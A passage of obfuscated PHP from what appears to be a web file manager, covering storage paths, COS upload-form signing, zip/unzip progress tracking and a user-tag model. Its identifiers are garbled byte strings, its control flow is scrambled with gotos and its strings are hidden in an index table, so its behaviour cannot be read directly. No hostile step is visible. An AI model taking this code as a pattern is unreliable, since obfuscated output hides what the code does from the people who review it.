D×íÄåäİ: if ($c¾†³š†×Ó) { return $c¾†³š†×Ó; } if ($föòĞªÁ× == $b©ÅŠˆ¼ÀÍ[1070]) { $c¾†³š†×Ó = self::make(Model($b©ÅŠˆ¼ÀÍ[751])->systemRootPathAdd($b©ÅŠˆ¼ÀÍ[1079])); } else { $c¾†³š†×Ó = self::systemPath($b©ÅŠˆ¼ÀÍ[1070]); $A‹®§¬——É = self::sourceID($c¾†³š†×Ó); $c¾†³š†×Ó = self::make(Model($b©ÅŠˆ¼ÀÍ[751])->mkdir($A‹®§¬——É, $föòĞªÁ×)); } Model($b©ÅŠˆ¼ÀÍ[1078])->set($f¡ºï»Ÿ«ç, $c¾†³š†×Ó); goto Eø±“¬å›Ó; EÆœ´Û¾»: } public static function systemFolder($d±•ø²ƒÒ°) { $e¯êµùÂ‘ = IO_PATH_SYSTEM_SOURCE . $d±•ø²ƒÒ°; $d‰°ŸÎ¢Ô  = Cache::get($e¯êµùÂ‘); if (!$d‰°ŸÎ¢Ô ) { $a¿ªé¦Ü—å = IO::infoFull($e¯êµùÂ‘); if (!$a¿ªé¦Ü—å) { $d‰°ŸÎ¢Ô  = IO::mkdir($e¯êµùÂ‘, REPEAT_SKIP); } else { $d‰°ŸÎ¢Ô  = $a¿ªé¦Ü—å[$_SERVER[ºÖÙÂŒäÉê‡][75]]; } Cache::set($e¯êµùÂ‘, $d‰°ŸÎ¢Ô , 3600 * 10); } return $d‰°ŸÎ¢Ô ; } public static function defaultDriver() { return Model($_SERVER[ºÖÙÂŒäÉê‡][701])->defaultDriver(); } public static function defaultIO() { $e´·¿Ò„ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÍèÒËßÔ = self::defaultDriver(); return $e´·¿Ò„ù[1080] . $fÍèÒËßÔ[$e´·¿Ò„ù[372]] . $e´·¿Ò„ù[1067]; } public static function fileTypeList() { $d¡¸ùÓé–¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cŒ‚´õŠÁµ = $GLOBALS[$d¡¸ùÓé–¸[6]][$d¡¸ùÓé–¸[1081]]; foreach ($cŒ‚´õŠÁµ as $bÇ®²î¬Ğğ => $fŞ×ŒÍ‰Å–) { $a«‹ø¨¹äó = $d¡¸ùÓé–¸[1082] . $bÇ®²î¬Ğğ; $Bòİ„‰«¹ø = LNG($a«‹ø¨¹äó); if ($a«‹ø¨¹äó != $Bòİ„‰«¹ø) { $cŒ‚´õŠÁµ[$bÇ®²î¬Ğğ][$d¡¸ùÓé–¸[28]] = $Bòİ„‰«¹ø; } } return $cŒ‚´õŠÁµ; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D¢ñ®¸ùŒ) { parent::__construct($D¢ñ®¸ùŒ); $this->signatureVersion($_SERVER[ºÖÙÂŒäÉê‡][206]); } public function uploadFormData($AÌé«Ì§áÛ, $fÑ…°—ŸŞ  = 3600) { goto cˆÆÇ“„´œ; cß–ˆ‡õËÖ: return $c—ë¥ÓŞÅ; goto bŞì«ø‘º; eõƒ´¦Å Š: $B®ŞÅí¼ÀĞ = $D¥º¥ùó×Ù[1083]; $dÛ’”ˆ… = gmdate($D¥º¥ùó×Ù[1084], time() + $fÑ…°—ŸŞ ); $Eº½–Øã°· = (string) time() . $D¥º¥ùó×Ù[67] . (string) (time() + $fÑ…°—ŸŞ ); goto BÌ§‡“…Ñğ; BÌ§‡“…Ñğ: $FÛßäÅ¡è¤ = array($D¥º¥ùó×Ù[1085] => $dÛ’”ˆ…, $D¥º¥ùó×Ù[1086] => array(array($D¥º¥ùó×Ù[1087] => $BÄ‹µ³í‹), array($D¥º¥ùó×Ù[1088] => $this->bucket), array($D¥º¥ùó×Ù[1089], $D¥º¥ùó×Ù[1090], $D¥º¥ùó×Ù[33]), array($D¥º¥ùó×Ù[1091] => $B®ŞÅí¼ÀĞ), array($D¥º¥ùó×Ù[1092] => $Aæõ¹ÁÜ¦), array($D¥º¥ùó×Ù[1093] => $this->accessKey), array($D¥º¥ùó×Ù[1094] => $Eº½–Øã°·))); $FÛßäÅ¡è¤ = json_encode($FÛßäÅ¡è¤); $d½òàË¤ÁÈ = hash_hmac($D¥º¥ùó×Ù[223], $Eº½–Øã°·, $this->secret); goto Fã‰‰Â§ğ; Fã‰‰Â§ğ: $aö÷¢ÏÍù¤ = sha1($FÛßäÅ¡è¤); $Eœ™¸«á¶Ì = hash_hmac($D¥º¥ùó×Ù[223], $aö÷¢ÏÍù¤, $d½òàË¤ÁÈ); $c—ë¥ÓŞÅ = array($D¥º¥ùó×Ù[1087] => $BÄ‹µ³í‹, $D¥º¥ùó×Ù[1091] => $B®ŞÅí¼ÀĞ, $D¥º¥ùó×Ù[1095] => base64_encode($FÛßäÅ¡è¤), $D¥º¥ùó×Ù[1092] => $Aæõ¹ÁÜ¦, $D¥º¥ùó×Ù[1093] => $this->accessKey, $D¥º¥ùó×Ù[1096] => $Eº½–Øã°·, $D¥º¥ùó×Ù[1097] => $Eœ™¸«á¶Ì, $D¥º¥ùó×Ù[165] => $this->getHost()); goto cß–ˆ‡õËÖ; cˆÆÇ“„´œ: $D¥º¥ùó×Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÄ‹µ³í‹ = $D¥º¥ùó×Ù[191]; $Aæõ¹ÁÜ¦ = $D¥º¥ùó×Ù[223]; goto eõƒ´¦Å Š; bŞì«ø‘º: } public function fileOutLink($Dˆ·áœ×§©) { $c†›ÍÀï©› =& $_SERVER[ºÖÙÂŒäÉê‡]; if (substr($Dˆ·áœ×§©, 0, 7) == $c†›ÍÀï©›[1098]) { $Dˆ·áœ×§© = $c†›ÍÀï©›[1099] . substr($Dˆ·áœ×§©, 7); } header($c†›ÍÀï©›[152] . $Dˆ·áœ×§©); die; } } goto F‚ˆ ôÊä³; dƒ±„¼œÊ§: class TaskHttp extends Task { protected function startAfter() { $cğ„éô÷§ =& $_SERVER[ºÖÙÂŒäÉê‡]; Hook::bind($cğ„éô÷§[1440], array($this, $cğ„éô÷§[1463])); Hook::bind($cğ„éô÷§[1442], array($this, $cğ„éô÷§[1464])); Hook::bind($cğ„éô÷§[1444], array($this, $cğ„éô÷§[1465])); } protected function endAfter() { $E¶éë¡Ã¸¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; Hook::unbind($E¶éë¡Ã¸¥[1440], array($this, $E¶éë¡Ã¸¥[1463])); Hook::unbind($E¶éë¡Ã¸¥[1442], array($this, $E¶éë¡Ã¸¥[1464])); Hook::unbind($E¶éë¡Ã¸¥[1444], array($this, $E¶éë¡Ã¸¥[1465])); } public function progressStart($Aî¯ìŸ») { $bÔÒÁÏå» =& $_SERVER[ºÖÙÂŒäÉê‡]; $aŠæï×ì£ = curl_getinfo($Aî¯ìŸ»); self::log($bÔÒÁÏå»[1466] . $aŠæï×ì£[$bÔÒÁÏå»[300]]); self::valueSet($this->task[$bÔÒÁÏå»[372]], $this->task); } public function progressEnd($eËÚÈ‚Õ«) { $f¢‡ùÅ¤èŸ =& $_SERVER[ºÖÙÂŒäÉê‡]; self::log($f¢‡ùÅ¤èŸ[1467] . $this->task[$f¢‡ùÅ¤èŸ[372]]); $this->end(); } public function progress($fà¤Óø†á˜, $fíš¸Ç»İ, $cÇïã“Ò…’, $fÉ˜ÊéÓßˆ, $e‡æ¢Üˆ‹”) { $B»Ï¤®Ë‡â =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÎ•­‡Š¤ò =& $this->task; if ($e‡æ¢Üˆ‹” > 0) { $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]] = $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]] == 0 ? $fÉ˜ÊéÓßˆ : $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]]; $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[980]] = $e‡æ¢Üˆ‹”; } else { if ($cÇïã“Ò…’ > 0) { $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]] = $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]] == 0 ? $fíš¸Ç»İ : $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[968]]; $BÎ•­‡Š¤ò[$B»Ï¤®Ë‡â[980]] = $cÇïã“Ò…’; } } $this->update(); self::log("\x70\x72\x6f\x67\162\145\x73\163\x48\x74\164\x70\72\144\157\x77\156\72{$cÇïã“Ò…’}\x2f{$fíš¸Ç»İ}\73\x20\165\160\154\157\x61\x64\x3a{$e‡æ¢Üˆ‹”}\57{$fÉ˜ÊéÓßˆ}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto DäËó¨Æó; D¬ÆÀË†: Hook::bind($A„¹ºËÕŸö[1025], array($this, $A„¹ºËÕŸö[1470])); $D©¥’ÈØÜ» =& $this->task; $D©¥’ÈØÜ»[$A„¹ºËÕŸö[1471]] = $A„¹ºËÕŸö[1030]; goto EçïÌ¯ÓÂ; DäËó¨Æó: $A„¹ºËÕŸö =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::startAfter(); Hook::bind($A„¹ºËÕŸö[1468], array($this, $A„¹ºËÕŸö[1469])); goto D¬ÆÀË†; EçïÌ¯ÓÂ: if (!$D©¥’ÈØÜ»[$A„¹ºËÕŸö[1309]]) { $D©¥’ÈØÜ»[$A„¹ºËÕŸö[1309]] = LNG($A„¹ºËÕŸö[1472]); } goto AÀÊ‘Ø‘½ß; AÀÊ‘Ø‘½ß: } protected function endAfter() { $EøÈËÂÆó =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::endAfter(); Hook::unbind($EøÈËÂÆó[1468], array($this, $EøÈËÂÆó[1469])); Hook::unbind($EøÈËÂÆó[1025], array($this, $EøÈËÂÆó[1470])); } public function updateAfter() { $BˆÁ¬áÑÖ• =& $_SERVER[ºÖÙÂŒäÉê‡]; $B£Ÿ¢±ù­Ç =& $this->task; if (!$B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[968]] || !$B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[695]]) { return; } if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1471]] == $BˆÁ¬áÑÖ•[1030]) { $C‚¤…è‹ÛÀ = 0; if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1448]]) { $C‚¤…è‹ÛÀ = $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1449]] / $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1448]]; } $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]] = $C‚¤…è‹ÛÀ * 0.3; } else { if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1471]] == $BˆÁ¬áÑÖ•[306]) { $C‚¤…è‹ÛÀ = $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[980]] / $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[968]]; $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]] = 0.3 + $C‚¤…è‹ÛÀ * 0.4; } else { if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1471]] == $BˆÁ¬áÑÖ•[102]) { $dğ÷¢º­´Ğ = 0; if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1450]] == $BˆÁ¬áÑÖ•[102]) { $dğ÷¢º­´Ğ = $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1449]]; } $C‚¤…è‹ÛÀ = ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1453]] + $dğ÷¢º­´Ğ) / $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[695]]; $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]] = 0.3 + 0.4 + $C‚¤…è‹ÛÀ * 0.3; } } } if ($B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]] > 0) { $c”œ‚ËÏš” = timeFloat() - $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1406]] - $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1409]]; $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1410]] = $c”œ‚ËÏš” * (1 - $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]]) / $B£Ÿ¢±ù­Ç[$BˆÁ¬áÑÖ•[1404]]; } } public function addFile($f¾†¿ÙĞÁ) { goto fˆáÅŒÓ†; cÅŸ¸‘²Îß: $this->update(); goto dšÚ²¶óñ; eÙ‰‘œ³…Ã: $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[1446]] = $eŸ÷Òù‰é[$f²“ù–ÉäŠ[28]]; $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[1448]] = $eŸ÷Òù‰é[$f²“ù–ÉäŠ[77]]; $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[1449]] = 0; goto cËğƒàöë; cËğƒàöë: $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[970]] = $f²“ù–ÉäŠ[1461]; $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[1450]] = $f²“ù–ÉäŠ[1030]; $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[695]] = $eŸ÷Òù‰é[$f²“ù–ÉäŠ[77]]; goto AóöµØ‹Ë‚; fˆáÅŒÓ†: $f²“ù–ÉäŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fˆèƒëÃÏÈ =& $this->task; $eŸ÷Òù‰é = IO::info($f¾†¿ÙĞÁ); goto eÙ‰‘œ³…Ã; AóöµØ‹Ë‚: $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[968]] = 1; $b¢’­Š³¯ = 0; $fˆèƒëÃÏÈ[$f²“ù–ÉäŠ[1454]] = array($f²“ù–ÉäŠ[1455] => $b¢’­Š³¯ + 1, $f²“ù–ÉäŠ[391] => $eŸ÷Òù‰é[$f²“ù–ÉäŠ[28]], $f²“ù–ÉäŠ[75] => $eŸ÷Òù‰é[$f²“ù–ÉäŠ[75]], $f²“ù–ÉäŠ[470] => $eŸ÷Òù‰é[$f²“ù–ÉäŠ[470]] ? $eŸ÷Òù‰é[$f²“ù–ÉäŠ[470]] : $eŸ÷Òù‰é[$f²“ù–ÉäŠ[75]]); goto cÅŸ¸‘²Îß; dšÚ²¶óñ: } public function unzipAfter($fãõ‹ŸÙ¹­) { goto CÍ”ê„·³­; aéÁÀ‚óĞË: $D¡æá–‡¬ = IO::infoWithChildren($fãõ‹ŸÙ¹­); $fËöÕÕ½ÈÕ = 0; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1454]] = array($fÃ¨ËµˆÕÔ[1455] => $fËöÕÕ½ÈÕ + 1, $fÃ¨ËµˆÕÔ[391] => $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[28]], $fÃ¨ËµˆÕÔ[75] => $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[75]], $fÃ¨ËµˆÕÔ[470] => $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[470]] ? $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[470]] : $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[75]]); goto CñãÉÉÂ§; CñãÉÉÂ§: if ($D¡æá–‡¬[$fÃ¨ËµˆÕÔ[29]] == $fÃ¨ËµˆÕÔ[163]) { $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[968]] = 1; } else { $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[968]] = $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[80]][$fÃ¨ËµˆÕÔ[78]]; } $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[970]] = $fÃ¨ËµˆÕÔ[33]; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1450]] = 0; goto AÔ‡·ØÍŸ¾; AèÚÃ‘’Û: $this->update(); self::log($fÃ¨ËµˆÕÔ[1473] . json_encode(array($E—¬½°ä¹, $D¡æá–‡¬))); goto FÓõ™¤İ³ò; AÔ‡·ØÍŸ¾: $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[980]] = 0; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1448]] = 0; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1449]] = 0; goto C•Íò˜î; C•Íò˜î: $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1446]] = $fÃ¨ËµˆÕÔ[33]; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1453]] = 0; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[695]] = $D¡æá–‡¬[$fÃ¨ËµˆÕÔ[77]]; goto AèÚÃ‘’Û; CÍ”ê„·³­: $fÃ¨ËµˆÕÔ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E—¬½°ä¹ =& $this->task; $E—¬½°ä¹[$fÃ¨ËµˆÕÔ[1471]] = $fÃ¨ËµˆÕÔ[102]; goto aéÁÀ‚óĞË; FÓõ™¤İ³ò: } public function nameParse($eÓô°§¦) { goto fÃ÷Ë½éæô; fÃ÷Ë½éæô: $DÄôóßÇÁï =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¢ÊÏæ’Â =& $this->task; if ($b¢ÊÏæ’Â[$DÄôóßÇÁï[1471]] == $DÄôóßÇÁï[1030]) { $b¢ÊÏæ’Â[$DÄôóßÇÁï[1471]] = $DÄôóßÇÁï[306]; $b¢ÊÏæ’Â[$DÄôóßÇÁï[1453]] = 0; $b¢ÊÏæ’Â[$DÄôóßÇÁï[695]] = 0; } goto C¯³ª‹—é; C¯³ª‹—é: $b¢Ÿàî‹©¬ = get_path_this($eÓô°§¦); if (strstr($b¢Ÿàî‹©¬, $DÄôóßÇÁï[91])) { $b¢ÊÏæ’Â[$DÄôóßÇÁï[980]] += 1; $b¢ÊÏæ’Â[$DÄôóßÇÁï[968]] += 1; } $b¢ÊÏæ’Â[$DÄôóßÇÁï[1446]] = $eÓô°§¦; goto döõñÃĞƒ¤; döõñÃĞƒ¤: $this->update(); goto bÅÊİç©; bÅÊİç©: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $bòà„Ç™ÇØ =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::startAfter(); Hook::bind($bòà„Ç™ÇØ[1474], array($this, $bòà„Ç™ÇØ[1469])); $bäŠŞ”Å¹ =& $this->task; $bäŠŞ”Å¹[$bòà„Ç™ÇØ[1471]] = $bòà„Ç™ÇØ[1030]; if (!$bäŠŞ”Å¹[$bòà„Ç™ÇØ[1309]]) { $bäŠŞ”Å¹[$bòà„Ç™ÇØ[1309]] = LNG($bòà„Ç™ÇØ[1475]); } } protected function endAfter() { $b±çåÜØ¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::endAfter(); Hook::unbind($b±çåÜØ¼[1474], array($this, $b±çåÜØ¼[1469])); } public function updateAfter() { $c”È½Ä¼÷¯ =& $_SERVER[ºÖÙÂŒäÉê‡]; $CŞ‹ÏÍİÆÎ =& $this->task; if (!$CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[968]] || !$CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[695]]) { return; } if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1471]] == $c”È½Ä¼÷¯[1030]) { $Aøº¯í‚Œ® = $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1449]]; if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1450]] != $c”È½Ä¼÷¯[1030]) { $Aøº¯í‚Œ® = 0; } $e‚Ö¸ÖÉŠ¾ = ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1453]] + $Aøº¯í‚Œ®) / $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[695]]; $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]] = $e‚Ö¸ÖÉŠ¾ * 0.3; } else { if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1471]] == $c”È½Ä¼÷¯[306]) { $e‚Ö¸ÖÉŠ¾ = $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[980]] / $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[968]]; $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]] = 0.3 + $e‚Ö¸ÖÉŠ¾ * 0.5; } else { if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1471]] == $c”È½Ä¼÷¯[102]) { $e‚Ö¸ÖÉŠ¾ = 0; if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1448]]) { $e‚Ö¸ÖÉŠ¾ = $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1449]] / $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1448]]; } $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]] = 0.3 + 0.5 + $e‚Ö¸ÖÉŠ¾ * 0.2; } } } if ($CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]] > 0) { $B¯ĞÀƒ‹Óç = timeFloat() - $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1406]] - $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1409]]; $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1410]] = $B¯ĞÀƒ‹Óç * (1 - $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]]) / $CŞ‹ÏÍİÆÎ[$c”È½Ä¼÷¯[1404]]; } } public function copyFileStart($c»òÂ¹“ØÁ, $d¤¿ª ¨ØØ, $D—í î¶¿Ö, $Fä©÷¦£¾, $dƒÂ‚¾Š‘, $E¯–°›Õ) { $Dã¬ŒâÓ›Ÿ =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::copyFileStart($c»òÂ¹“ØÁ, $d¤¿ª ¨ØØ, $D—í î¶¿Ö, $Fä©÷¦£¾, $dƒÂ‚¾Š‘, $E¯–°›Õ); $A¨•Ûîïâ· =& $this->task; if ($A¨•Ûîïâ·[$Dã¬ŒâÓ›Ÿ[1471]] == $Dã¬ŒâÓ›Ÿ[306]) { $A¨•Ûîïâ·[$Dã¬ŒâÓ›Ÿ[1471]] = $Dã¬ŒâÓ›Ÿ[102]; } $this->update(); } public function copyFileEnd($D‡ğùÙª‰í, $d†‡ÌçŞôà, $f â¦Çš¯, $e§ì‹àÔç, $Aƒä³Ê®¶©, $b—‹’İ¥«Š) { $DÕÙ¡“Ô÷Ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¦Ëá³†×† =& $this->task; $D¦Ëá³†×†[$DÕÙ¡“Ô÷Ä[1449]] = $D¦Ëá³†×†[$DÕÙ¡“Ô÷Ä[1448]]; $D¦Ëá³†×†[$DÕÙ¡“Ô÷Ä[1453]] += $D¦Ëá³†×†[$DÕÙ¡“Ô÷Ä[1448]]; $D¦Ëá³†×†[$DÕÙ¡“Ô÷Ä[1450]] = $DÕÙ¡“Ô÷Ä[33]; $this->update(); } public function nameParse($Aæ—’´´“‰) { $CèÎ¡ÕÄ‚¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C…¿÷Ä† =& $this->task; if ($C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[980]] < $C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[968]]) { $a±ÁÌ÷†¾‘ = get_path_this($Aæ—’´´“‰); if (strstr($a±ÁÌ÷†¾‘, $CèÎ¡ÕÄ‚¤[91])) { $C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[980]] += 1; } } if ($C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[1471]] == $CèÎ¡ÕÄ‚¤[1030]) { $C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[1471]] = $CèÎ¡ÕÄ‚¤[306]; } $C…¿÷Ä†[$CèÎ¡ÕÄ‚¤[1446]] = $Aæ—’´´“‰; $this->update(); } } goto c³É¾ÌŠ…£; a•¬ñø‡‹˜: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($aÈ„´ˆÚÔù) { $A¤Áó¹¾œç =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($A¤Áó¹¾œç[2440] => array(USER_ID, $A¤Áó¹¾œç[2496])); } protected function listData() { $aÇ¨á¾óÉÏ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÆ’…†¶Ç = array($aÇ¨á¾óÉÏ[1394] => USER_ID, $aÇ¨á¾óÉÏ[440] => array($aÇ¨á¾óÉÏ[2497], 0)); $cëËÅĞ÷Øƒ = $aÇ¨á¾óÉÏ[2498]; $Bá÷µÔ˜è = $aÇ¨á¾óÉÏ[2499]; $fáƒÖˆ»“ø = $this->field($cëËÅĞ÷Øƒ)->where($EÆ’…†¶Ç)->order($Bá÷µÔ˜è)->select(); return $fáƒÖˆ»“ø ? $fáƒÖˆ»“ø : array(); } protected function listByTag($B¦™áŒğ­¢) { } protected function addToTag($cÙõ¨šÆ, $ağ„¿Ô‰—•) { $aÓé½Ü¤Ş =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!Model($aÓé½Ü¤Ş[2266])->listData($ağ„¿Ô‰—•) || !Model($aÓé½Ü¤Ş[751])->pathInfo($cÙõ¨šÆ)) { return !1; } $f…Òõùí×õ = array($aÓé½Ü¤Ş[1394] => USER_ID, $aÓé½Ü¤Ş[440] => $ağ„¿Ô‰—•, $aÓé½Ü¤Ş[392] => $cÙõ¨šÆ, $aÓé½Ü¤Ş[393] => $aÓé½Ü¤Ş[387], $aÓé½Ü¤Ş[391] => $aÓé½Ü¤Ş[33], $aÓé½Ü¤Ş[2070] => 0); if ($this->where($f…Òõùí×õ)->find()) { return !1; } return $this->add($f…Òõùí×õ); } protected function removeFromTag($cÇ¨±†™ƒÂ, $CÍ†¦½ìµ«) { $bƒª„‹©Àå =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!Model($bƒª„‹©Àå[2266])->listData($CÍ†¦½ìµ«) || !Model($bƒª„‹©Àå[751])->pathInfo($cÇ¨±†™ƒÂ)) { return !1; } $FË„¢Ä¦Šˆ = array($bƒª„‹©Àå[1394] => USER_ID, $bƒª„‹©Àå[440] => $CÍ†¦½ìµ«, $bƒª„‹©Àå[393] => $bƒª„‹©Àå[387], $bƒª„‹©Àå[392] => $cÇ¨±†™ƒÂ); return $this->where($FË„¢Ä¦Šˆ)->delete(); } protected function removeByTag($d¾ùªÅèŸÛ) { $DÃ»‘ÕÇáÂ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$d¾ùªÅèŸÛ) { return !1; } $DÏŠÎÃ•Ëà = array($DÃ»‘ÕÇáÂ[1394] => USER_ID, $DÃ»‘ÕÇáÂ[440] => $d¾ùªÅèŸÛ); return $this->where($DÏŠÎÃ•Ëà)->delete(); } protected function removeBySource($dÃœœ¥ÙÏ) { $CÏ·ã‚ªë¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bäÓÍÚï‡µ = array($CÏ·ã‚ªë¸[1394] => USER_ID, $CÏ·ã‚ªë¸[392] => $dÃœœ¥ÙÏ, $CÏ·ã‚ªë¸[440] => array($CÏ·ã‚ªë¸[920], 0)); return $this->where($bäÓÍÚï‡µ)->delete(); } }